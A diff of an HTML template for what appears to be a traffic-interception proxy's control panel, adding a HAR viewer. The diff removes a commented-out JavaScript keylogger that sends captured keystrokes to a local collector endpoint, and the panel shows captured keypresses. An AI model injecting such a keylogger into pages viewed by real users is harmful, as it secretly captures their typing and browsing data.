@@ -11,9 +11,9 @@
     </div>
   </div>
 </header>
-
-
-    <div class="buttons">
+force HAR flush with: http://127.0.0.1:8080/har
+  <div class="nav" id="wrapper">
+    <div class="nav" class="buttons">
       <ul>
       <li><button type="button" id="replace">Replace All Images</button></li>
       <li><button type="button" id="flip">Flip Images</button></li>
@@ -28,6 +28,11 @@
       <li><button type="button" id="intercept">Intercept HTTPS</button></li>
     </ul>
     </div>
+    <div class="nav">
+      <ul id='hars-discovered'></ul>
+    </div> <!-- har viewer here -->
+    <div class="nav" id='har-view'></div> <!-- har viewer here -->
+  </div>
     <div id="keypresses">
       <script>
       $( document ).ready(function(){
@@ -35,21 +40,6 @@
             $('#keypresses').append(data + "<br>")
           });}, 1000);
       </script>
-<!-- 
-      <script>var keys = '';
- 
-document.onkeypress = function(e) {
-    var get = window.event ? event : e;
-    var key = get.keyCode ? get.keyCode : get.charCode;
-    key = String.fromCharCode(key);
-    keys += key;
-}
- 
-window.setInterval(function(){
-    new Image().src = '//127.0.0.1:9000/App/AppendData?data='+keys;
-    keys = '';
-}, 1000);</script>
- -->
     </div>
 
 
@@ -83,4 +73,29 @@ window.setInterval(function(){
     });
   })
 </script>
+
+
+<script type='text/javascript'>
+//get the latest hars that are available
+// setInterval(function() {
+   $('#hars-discovered').empty()
+   $('#har-view').empty();
+$.getJSON("/App/GetHars", function( data ) {
+  $.each(data, function(i, j) {
+    // var listItem = $("<li class='har' id='"+j+"'>"+j+"</li>").click(function() {
+      
+      // console.log(" click click click " + $(this).attr("id"))
+    $.getJSON( "/public/hars/"+j, function( data ) {
+        $('#har-view').HarView();
+        var har = $('#har-view').data('HarView');
+        har.render(data);
+    });
+  })
+    // $('#hars-discovered').append(listItem)
+  })
+// })
+// }, 2000);
+</script>
+
+
 {{template "footer.html" .}}
